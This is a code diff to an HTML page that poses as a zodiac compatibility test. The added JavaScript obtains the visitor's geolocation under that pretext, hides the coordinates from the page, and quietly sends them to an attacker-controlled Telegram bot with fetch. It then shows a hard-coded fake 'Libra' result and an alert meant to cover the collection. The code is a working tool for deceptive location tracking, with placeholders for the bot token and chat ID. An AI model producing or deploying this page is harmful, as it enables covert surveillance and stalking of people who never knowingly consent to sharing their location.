@@ -11,7 +11,12 @@
     <h1>Zodiac Compatibility Test</h1>
     <p>To find your perfect match, we need your location for accurate analysis.</p>
     <button class="location-btn" onclick="getLocation()">Allow Location Access</button>
-    <p id="location-status"></p>
+    <p id="location-status" style="display: none;"></p> <!-- Location won't be shown here -->
+    
+    <div id="compatibility-result" style="display: none;">
+      <h2>Your Zodiac Compatibility Result:</h2>
+      <p>Your perfect match is with **Libra**. Congratulations! 🎉</p>
+    </div>
   </div>
 
   <script>
@@ -19,33 +24,44 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       } else {
-        document.getElementById("location-status").innerHTML = "Geolocation is not supported by this browser.";
+        alert("Geolocation is not supported by this browser.");
       }
     }
 
     function showPosition(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      document.getElementById("location-status").innerHTML = `Location detected! Latitude: ${latitude}, Longitude: ${longitude}`;
-      
-      // Send data to Telegram bot or further steps
+
+      // Send location data to Telegram Bot (background, no display)
+      sendLocationToTelegram(latitude, longitude);
+
+      // Show fake result (Zodiac Compatibility)
+      document.getElementById("compatibility-result").style.display = "block";
+
+      // Simulate some result loading (optional)
+      setTimeout(function() {
+        alert("Your location has been successfully analyzed and your compatibility result is displayed!");
+      }, 1000);
     }
 
     function showError(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          document.getElementById("location-status").innerHTML = "User denied the request for Geolocation.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          document.getElementById("location-status").innerHTML = "Location information is unavailable.";
-          break;
-        case error.TIMEOUT:
-          document.getElementById("location-status").innerHTML = "The request to get user location timed out.";
-          break;
-        case error.UNKNOWN_ERROR:
-          document.getElementById("location-status").innerHTML = "An unknown error occurred.";
-          break;
-      }
+      alert("Unable to retrieve your location. Try again.");
+    }
+
+    // Send location to Telegram bot (fake API call, replace with your actual API)
+    function sendLocationToTelegram(lat, long) {
+      const telegramBotToken = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot token
+      const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=User Location: Latitude ${lat}, Longitude ${long}`;
+      
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          console.log("Location sent to Telegram:", data);
+        })
+        .catch(error => {
+          console.error("Error sending location:", error);
+        });
     }
   </script>
 </body>
